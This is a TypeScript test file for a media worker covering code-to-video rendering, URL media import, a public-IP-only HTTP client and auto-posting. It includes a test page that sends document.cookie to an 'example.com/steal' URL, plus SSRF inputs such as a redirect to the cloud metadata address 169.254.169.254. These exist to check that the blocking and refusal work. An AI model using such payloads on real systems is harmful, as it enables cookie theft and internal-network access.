// The auto pipeline in the media worker: code_video_render (real Chromium through playwright-core,
// real ffmpeg; skipped with a message when Chromium cannot launch), url_import (mocked HTTP, never the
// network), the public-IP-only HTTP client, and autoPublish after video_render and clip_render.
// PGlite services + MemoryStorage.

import { execFile } from 'node:child_process'
import { mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { promisify } from 'node:util'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { IMPORT_URL_MESSAGES } from '@app/core/links'
import { FakeTranscriber } from '@app/transcription'
import { PermanentJobError } from '../../errors'
import { createWorkerHarness, jobRow, resetWorkerHarness, tenant, type WorkerHarness } from '../../../test/helpers'
import { createClipRender } from '../clip-render'
import { CODE_VIDEO_MESSAGES } from '../code-video'
import type { FetchLike } from '../drive'
import { createChromiumRenderer, resolveChromiumPath, type SlideRenderer } from '../renderer'
import { createCodeVideoRender, createVideoRender } from '../renders'
import { createPublicFetch, publicOnlyLookup, PrivateAddressError } from '../safe-fetch'
import { createSourceIngest } from '../source-ingest'
import { createTranscribe } from '../transcribe'
import { URL_IMPORT_MESSAGES, createUrlImport } from '../url-import'
import { bytesOf, createFixtures, fileResponse, probeBytes, redirectResponse, type Fixtures } from './fixtures'

const run = promisify(execFile)

async function chromiumProblem(): Promise<string | null> {
  const path = resolveChromiumPath()
  if (!path) return 'no Chromium executable found (set CHROMIUM_PATH)'
  const dir = await mkdtemp(join(tmpdir(), 'chromium-check-'))
  try {
    await createChromiumRenderer({ executablePath: path, launchTimeoutMs: 20_000 }).render([{ html: '<p>ok</p>', outPath: join(dir, 'ok.png') }], { width: 64, height: 64 })
    return null
  } catch (error) {
    return error instanceof Error ? error.message : String(error)
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
}

const chromiumIssue = await chromiumProblem()
if (chromiumIssue) console.warn(`[auto-post] code video tests skipped: ${chromiumIssue}`)

let h: WorkerHarness
let fx: Fixtures
beforeAll(async () => {
  ;[h, fx] = await Promise.all([createWorkerHarness(), createFixtures()])
}, 120_000)
afterAll(async () => {
  await h.db.close()
  await fx.cleanup()
})
beforeEach(async () => {
  await resetWorkerHarness(h)
  h.storage.clear()
  h.context.transcriber = new FakeTranscriber({ requireFile: true })
})

const turnOn = (userId: string, brandId: string, extra: Record<string, unknown> = {}) =>
  h.services.brands.setAutoPost(userId, brandId, { enabled: true, tiktokPrivacy: 'PUBLIC_TO_EVERYONE', ...extra }, { via: 'web' })

/** The average colour (r, g, b) of one frame at `seconds`, via ffmpeg (scaled to 1 pixel). */
async function colourAt(bytes: Uint8Array, seconds: number): Promise<number[]> {
  const dir = await mkdtemp(join(tmpdir(), 'frame-'))
  try {
    const file = join(dir, 'v.mp4')
    await writeFile(file, bytes)
    const out = await run('ffmpeg', ['-v', 'error', '-ss', String(seconds), '-i', file, '-frames:v', '1', '-vf', 'scale=1:1', '-f', 'rawvideo', '-pix_fmt', 'rgb24', '-'], {
      encoding: 'buffer',
      maxBuffer: 1024,
    })
    return [...(out.stdout as Buffer)]
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
}

const near = (rgb: number[], target: number[], tolerance = 40) => rgb.length === 3 && rgb.every((v, i) => Math.abs(v - (target[i] ?? 0)) <= tolerance)

// ---------------------------------------------------------------------------------------------
// code_video_render
// ---------------------------------------------------------------------------------------------

const SEEK_HTML = `<!doctype html><html><body style="margin:0">
<div id="box" style="width:100vw;height:100vh;background:#000"></div>
<script>
  // async seek that waits for a timer: runs on the virtual clock
  window.seek = async (ms) => {
    await new Promise((resolve) => setTimeout(resolve, 0));
    document.getElementById('box').style.background = ms < 500 ? '#00ff00' : '#ff00ff';
  };
</script></body></html>`

const CSS_HTML = `<!doctype html><html><head><style>
  html, body { margin: 0; width: 100%; height: 100%; }
  #b { width: 100%; height: 100%; animation: fade 1s linear forwards; }
  @keyframes fade { from { background: #ff0000; } to { background: #0000ff; } }
</style></head><body><div id="b"></div></body></html>`

const FETCH_HTML = `<!doctype html><html><body style="margin:0;background:#00ffff">
<script>
  fetch('https://example.com/steal?c=' + document.cookie).then(() => { document.body.style.background = '#ff0000' }, () => {});
  new Image().src = 'https://example.com/pixel.png';
  try { new WebSocket('wss://example.com/ws') } catch (e) {}
</script></body></html>`

describe.skipIf(chromiumIssue !== null)('code_video_render (Chromium + ffmpeg)', () => {
  it('window.seek: a 1080×1080 MP4 of the right length, frames from seek(ms), then a draft', async () => {
    const t = await tenant(h, 'youtube')
    const job = await h.services.renders.requestCodeVideo(t.userId, { brandId: t.brandId, html: SEEK_HTML, durationMs: 1_000, fps: 30, aspect: '1:1', caption: 'Made in code', title: 'Code video' })
    const outcome = (await createCodeVideoRender()((await h.r.jobs.get(job.id))!, h.context)) as Record<string, unknown> & { mediaIds: string[]; draftId: string }
    expect(outcome).toMatchObject({ frames: 30, usedSeek: true, platforms: ['youtube'] })
    expect(outcome.autoPost).toBeUndefined()
    const media = await h.services.media.getForWorker(t.userId, outcome.mediaIds[0]!)
    expect(media).toMatchObject({ kind: 'video', origin: 'render', mimeType: 'video/mp4', width: 1080, height: 1080 })
    const bytes = h.storage.getBytes(media.storageKey) ?? new Uint8Array()
    const probed = await probeBytes(bytes)
    expect(probed.video).toMatchObject({ width: 1080, height: 1080, codec: 'h264', fps: 30 })
    expect(probed.audio?.codec).toBe('aac')
    expect(Math.abs((probed.durationMs ?? 0) - 1_000)).toBeLessThanOrEqual(60)
    expect(near(await colourAt(bytes, 0.1), [0, 255, 0])).toBe(true)
    expect(near(await colourAt(bytes, 0.8), [255, 0, 255])).toBe(true)
    const draft = await h.services.drafts.get(t.userId, outcome.draftId)
    expect(draft.draft.status).toBe('draft')
    expect(draft.variants[0]).toMatchObject({ platform: 'youtube', text: 'Made in code', title: 'Code video' })
  }, 90_000)

  it('a CSS animation is stepped frame by frame (9:16, 24 fps), and autoPublish posts it when Auto-post is on', async () => {
    const t = await tenant(h, 'youtube')
    await turnOn(t.userId, t.brandId)
    const job = await h.services.renders.requestCodeVideo(t.userId, { brandId: t.brandId, html: CSS_HTML, durationMs: 1_000, fps: 24, caption: 'Fade', autoPublish: { when: 'now' } })
    const outcome = (await createCodeVideoRender()((await h.r.jobs.get(job.id))!, h.context)) as Record<string, unknown> & { mediaIds: string[]; draftId: string; autoPost: { outcome: string; postIds: string[] } }
    expect(outcome).toMatchObject({ frames: 24, usedSeek: false })
    const media = await h.services.media.getForWorker(t.userId, outcome.mediaIds[0]!)
    const bytes = h.storage.getBytes(media.storageKey) ?? new Uint8Array()
    const probed = await probeBytes(bytes)
    expect(probed.video).toMatchObject({ width: 1080, height: 1920 })
    expect(Math.abs((probed.durationMs ?? 0) - 1_000)).toBeLessThanOrEqual(60)
    expect(near(await colourAt(bytes, 0), [255, 0, 0])).toBe(true)
    const mid = await colourAt(bytes, 0.5)
    expect(mid[0]).toBeGreaterThan(90)
    expect(mid[2]).toBeGreaterThan(90)
    // autoPublish: approved by the rule and scheduled
    expect(outcome.autoPost).toMatchObject({ outcome: 'posted', autoPosted: true })
    expect(outcome.autoPost.postIds).toHaveLength(1)
    const draft = await h.services.drafts.get(t.userId, outcome.draftId)
    expect(draft.draft).toMatchObject({ status: 'approved', approvedVia: 'auto_post' })
  }, 90_000)

  it('blocks every network request (fetch, images, WebSockets) and still renders', async () => {
    const t = await tenant(h, 'instagram')
    const job = await h.services.renders.requestCodeVideo(t.userId, { brandId: t.brandId, html: FETCH_HTML, durationMs: 1_000, fps: 24, aspect: '16:9' })
    const outcome = (await createCodeVideoRender()((await h.r.jobs.get(job.id))!, h.context)) as Record<string, unknown> & { mediaIds: string[]; blockedRequests: number }
    expect(outcome.blockedRequests).toBeGreaterThanOrEqual(2)
    const media = await h.services.media.getForWorker(t.userId, outcome.mediaIds[0]!)
    const bytes = h.storage.getBytes(media.storageKey) ?? new Uint8Array()
    expect((await probeBytes(bytes)).video).toMatchObject({ width: 1920, height: 1080 })
    // the fetch never succeeded: the page kept its colour
    expect(near(await colourAt(bytes, 0.9), [0, 255, 255])).toBe(true)
  }, 90_000)

  it('a page whose scripts break the frame loop fails for good (no retries) with the reason', async () => {
    const t = await tenant(h, 'instagram')
    const html = '<!doctype html><script>document.getAnimations = () => { throw new Error("nope") }</script>'
    const job = await h.services.renders.requestCodeVideo(t.userId, { brandId: t.brandId, html, durationMs: 1_000, fps: 24, aspect: '1:1' })
    const error = await createCodeVideoRender()((await h.r.jobs.get(job.id))!, h.context).catch((e: unknown) => e)
    expect(error).toBeInstanceOf(PermanentJobError)
    expect((error as Error).message).toMatch(new RegExp(`^${CODE_VIDEO_MESSAGES.pageFailed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')} \\(.*nope`))
  }, 60_000)

  it('a page whose seek never finishes fails for good with a clear message', async () => {
    const t = await tenant(h, 'instagram')
    const html = '<!doctype html><script>window.seek = () => new Promise(() => {})</script>'
    const job = await h.services.renders.requestCodeVideo(t.userId, { brandId: t.brandId, html, durationMs: 1_000, fps: 24, aspect: '1:1' })
    const handler = createCodeVideoRender({ codeVideoTimeouts: { frameMs: 1_500 } })
    const error = await handler((await h.r.jobs.get(job.id))!, h.context).catch((e: unknown) => e)
    expect(error).toBeInstanceOf(PermanentJobError)
    expect((error as Error).message).toBe(CODE_VIDEO_MESSAGES.frameTimeout)
  }, 60_000)
})

// ---------------------------------------------------------------------------------------------
// url_import
// ---------------------------------------------------------------------------------------------

/** A fetch mock that answers in order and records the URLs it was asked for. */
function scripted(answers: Array<Response | Error>) {
  const calls: string[] = []
  const fetch: FetchLike = async (url) => {
    calls.push(url)
    const next = answers.shift()
    if (!next) throw new Error(`unexpected fetch ${url}`)
    if (next instanceof Error) throw next
    return next
  }
  return { fetch, calls }
}

async function imported(userId: string, url = 'https://cdn.example.com/renders/final.mp4?sig=abc', kind: 'video' | 'image' = 'video') {
  const { media } = await h.services.media.importFromUrl(userId, { url, kind })
  return media
}

describe('url_import', () => {
  it('downloads through allowed redirects, probes, stores, marks ready and drops the link (no clipping time)', async () => {
    const t = await tenant(h, 'instagram')
    const media = await imported(t.userId)
    const bytes = await bytesOf(fx.landscape)
    const { fetch, calls } = scripted([redirectResponse('https://media.cdn-files.net/abc.mp4'), fileResponse(bytes, 'video/mp4')])
    const outcome = await createUrlImport({ importFetch: fetch })(jobRow('url_import', { userId: t.userId, mediaId: media.id }), h.context)
    expect(outcome).toMatchObject({ mediaId: media.id, status: 'ready', transcribe: false })
    expect(calls).toEqual(['https://cdn.example.com/renders/final.mp4?sig=abc', 'https://media.cdn-files.net/abc.mp4'])
    const row = await h.services.media.getForWorker(t.userId, media.id)
    expect(row).toMatchObject({ status: 'ready', origin: 'url_import', mimeType: 'video/mp4', width: 640, height: 360, bytes: bytes.byteLength, sourceUrl: null })
    expect(h.storage.getBytes(row.storageKey)?.byteLength).toBe(bytes.byteLength)
    expect((await h.services.usage.balance(t.userId, 'clip_seconds')).used).toBe(0)
  })

  it('a draft waiting for Auto-post on the imported file is posted once it is ready', async () => {
    const t = await tenant(h, 'instagram')
    await turnOn(t.userId, t.brandId)
    const media = await imported(t.userId)
    const res = await h.services.autoPost.publishVideo(t.userId, { brandId: t.brandId, mediaId: media.id, caption: 'From a link' })
    expect(res.autoPost.outcome).toBe('waiting_for_media')
    const { fetch } = scripted([fileResponse(await bytesOf(fx.landscape), 'video/mp4')])
    await createUrlImport({ importFetch: fetch })(jobRow('url_import', { userId: t.userId, mediaId: media.id }), h.context)
    expect(await h.services.autoPost.status(t.userId, res.draft.draft.id)).toMatchObject({ outcome: 'posted', autoPosted: true })
  })

  it('imports an image (type from its bytes)', async () => {
    const t = await tenant(h, 'instagram')
    const media = await imported(t.userId, 'https://cdn.example.com/cover.png', 'image')
    const { fetch } = scripted([fileResponse(await bytesOf(fx.image), 'image/png')])
    expect(await createUrlImport({ importFetch: fetch })(jobRow('url_import', { userId: t.userId, mediaId: media.id }), h.context)).toMatchObject({ status: 'ready' })
    expect(await h.services.media.getForWorker(t.userId, media.id)).toMatchObject({ mimeType: 'image/png', width: 200, height: 100, status: 'ready' })
  })

  it('refuses redirects to video sites or private hosts, web pages and non-video bodies (media failed, nothing stored)', async () => {
    const t = await tenant(h, 'instagram')
    const cases: Array<{ answers: Array<Response | Error>; message: string }> = [
      { answers: [redirectResponse('https://www.youtube.com/watch?v=abc')], message: IMPORT_URL_MESSAGES.video_site_forbidden },
      { answers: [redirectResponse('https://169.254.169.254/latest/meta-data')], message: IMPORT_URL_MESSAGES.ip_literal },
      { answers: [redirectResponse('https://localhost/x.mp4')], message: IMPORT_URL_MESSAGES.private_host },
      { answers: [fileResponse(new TextEncoder().encode('<html>login</html>'), 'text/html')], message: URL_IMPORT_MESSAGES.notVideo },
      { answers: [fileResponse(await bytesOf(fx.text), 'video/mp4')], message: URL_IMPORT_MESSAGES.unreadable },
      { answers: [new Response('gone', { status: 404 })], message: URL_IMPORT_MESSAGES.notAvailable },
      { answers: [Object.assign(new PrivateAddressError('cdn.example.com resolves to a non-public address'), {})], message: IMPORT_URL_MESSAGES.private_host },
    ]
    for (const c of cases) {
      const media = await imported(t.userId, `https://cdn.example.com/${crypto.randomUUID()}.mp4`)
      const { fetch, calls } = scripted([...c.answers])
      const outcome = await createUrlImport({ importFetch: fetch })(jobRow('url_import', { userId: t.userId, mediaId: media.id }), h.context)
      expect(outcome, c.message).toMatchObject({ status: 'failed', error: c.message })
      expect(calls.some((u) => /youtube|169\.254|localhost/.test(u)), 'a refused hop is never fetched').toBe(false)
      const row = await h.services.media.getForWorker(t.userId, media.id)
      expect(row).toMatchObject({ status: 'failed', sourceUrl: null })
      expect(h.storage.getBytes(row.storageKey) ?? null).toBeNull()
    }
  })

  it('retries temporary failures and gives up (media failed) on the last attempt', async () => {
    const t = await tenant(h, 'instagram')
    const media = await imported(t.userId)
    const handler = createUrlImport({ importFetch: scripted([new Response('busy', { status: 503 }), new Response('busy', { status: 503 })]).fetch })
    await expect(handler(jobRow('url_import', { userId: t.userId, mediaId: media.id }), h.context)).rejects.toThrow(/busy/)
    expect((await h.services.media.getForWorker(t.userId, media.id)).status).toBe('pending')
    await expect(handler(jobRow('url_import', { userId: t.userId, mediaId: media.id }, { attempts: 5 }), h.context)).rejects.toThrow()
    expect((await h.services.media.getForWorker(t.userId, media.id)).status).toBe('failed')
  })
})

describe('public-IP-only HTTP client', () => {
  const lookup = (addresses: Array<{ address: string; family: number }>) => publicOnlyLookup(async () => addresses)
  const call = (fn: ReturnType<typeof publicOnlyLookup>, all: boolean) =>
    new Promise<{ error: Error | null; address: unknown }>((resolve) => fn('cdn.example.com', all ? { all: true } : {}, (error, address) => resolve({ error, address })))

  it('resolves public addresses and refuses private ones (even one in a mixed answer)', async () => {
    expect(await call(lookup([{ address: '93.184.216.34', family: 4 }]), false)).toEqual({ error: null, address: '93.184.216.34' })
    expect((await call(lookup([{ address: '2606:4700::1', family: 6 }]), true)).address).toEqual([{ address: '2606:4700::1', family: 6 }])
    for (const bad of ['127.0.0.1', '10.0.0.2', '169.254.169.254', '::1', 'fd00::1', '::ffff:192.168.0.1']) {
      const r = await call(lookup([{ address: bad, family: bad.includes(':') ? 6 : 4 }]), false)
      expect(r.error, bad).toBeInstanceOf(PrivateAddressError)
    }
    expect((await call(lookup([{ address: '93.184.216.34', family: 4 }, { address: '10.0.0.1', family: 4 }]), true)).error).toBeInstanceOf(PrivateAddressError)
  })

  it('never connects to a host that resolves privately, and only speaks https', async () => {
    const fetch = createPublicFetch({ resolver: async () => [{ address: '127.0.0.1', family: 4 }] })
    await expect(fetch('https://rebind.example.net/x.mp4')).rejects.toMatchObject({ code: 'EPRIVATEADDRESS' })
    await expect(fetch('http://cdn.example.com/x.mp4')).rejects.toThrow(/https/)
  })
})

// ---------------------------------------------------------------------------------------------
// autoPublish on template renders and clips
// ---------------------------------------------------------------------------------------------

const ffmpegCards: SlideRenderer = {
  async render(pages, size) {
    for (const page of pages) {
      if (typeof page.html !== 'string') await page.html()
      await run('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-y', '-f', 'lavfi', '-i', `color=c=0x203060:s=${size.width}x${size.height}:d=1`, '-frames:v', '1', page.outPath])
    }
  },
}

describe('autoPublish after renders', () => {
  it('video_render: the draft waits when Auto-post is off, and is posted at the "best" slot when on', async () => {
    const t = await tenant(h, 'tiktok')
    const off = await h.services.renders.requestVideo(t.userId, { brandId: t.brandId, slides: [{ text: 'Off', durationMs: 3_000 }], autoPublish: {} })
    const offOutcome = (await createVideoRender({ renderer: ffmpegCards })((await h.r.jobs.get(off.id))!, h.context)) as { draftId: string; autoPost: { outcome: string } }
    expect(offOutcome.autoPost).toMatchObject({ outcome: 'switch_off', autoPosted: false })
    expect((await h.services.drafts.get(t.userId, offOutcome.draftId)).draft.status).toBe('draft')

    await turnOn(t.userId, t.brandId)
    const on = await h.services.renders.requestVideo(t.userId, { brandId: t.brandId, slides: [{ text: 'On', durationMs: 3_000 }], autoPublish: { when: 'best' } })
    const row = (await h.r.jobs.get(on.id))!
    const outcome = (await createVideoRender({ renderer: ffmpegCards })(row, h.context)) as { draftId: string; autoPost: { outcome: string; postIds: string[] } }
    expect(outcome.autoPost).toMatchObject({ outcome: 'posted', autoPosted: true })
    const posts = await h.services.posts.list(t.userId, { draftId: outcome.draftId })
    expect(posts[0]?.scheduledFor.toISOString()).toBe('2026-11-02T19:00:00.000Z') // TikTok's 19:00 slot (UTC brand)
    // a retried job reuses its draft and gets the same decision (nothing scheduled twice)
    const retried = (await createVideoRender({ renderer: ffmpegCards })(row, h.context)) as { draftId: string; autoPost: { postIds: string[] } }
    expect(retried.draftId).toBe(outcome.draftId)
    expect(retried.autoPost.postIds).toEqual(outcome.autoPost.postIds)
  }, 60_000)

  it('make_clips with autoPublish: each rendered clip draft goes through the rule', async () => {
    const t = await tenant(h, 'tiktok')
    await turnOn(t.userId, t.brandId)
    const bytes = await bytesOf(fx.landscape)
    const created = await h.services.media.createUpload(t.userId, { filename: 'talk.mp4', contentType: 'video/mp4', bytes: bytes.byteLength, rightsAttested: true }, { purpose: 'clip_source' })
    await h.storage.putBytes(created.media.storageKey, bytes, 'video/mp4')
    await h.services.media.completeUpload(t.userId, created.media.id)
    await createSourceIngest({ streamSources: false })(jobRow('source_ingest', { userId: t.userId, mediaId: created.media.id }), h.context)
    await createTranscribe({ streamSources: false })(jobRow('transcribe', { userId: t.userId, mediaId: created.media.id }), h.context)
    const [clip] = await h.services.clips.requestClips(t.userId, { mediaId: created.media.id, brandId: t.brandId, ranges: [{ startMs: 0, endMs: 3_000, hook: 'Watch this' }], autoPublish: { when: 'now' } })
    const job = (await h.services.jobs.listForUser(t.userId, { type: 'clip_render' }))[0]!
    const outcome = (await createClipRender({ streamSources: false })((await h.r.jobs.get(job.id))!, h.context)) as { draftId: string; autoPost: { outcome: string } }
    expect(outcome.autoPost).toMatchObject({ outcome: 'posted', autoPosted: true })
    const draft = await h.services.drafts.get(t.userId, outcome.draftId)
    expect(draft.draft).toMatchObject({ status: 'approved', approvedVia: 'auto_post', sourceClipId: clip?.id })
  }, 90_000)
})
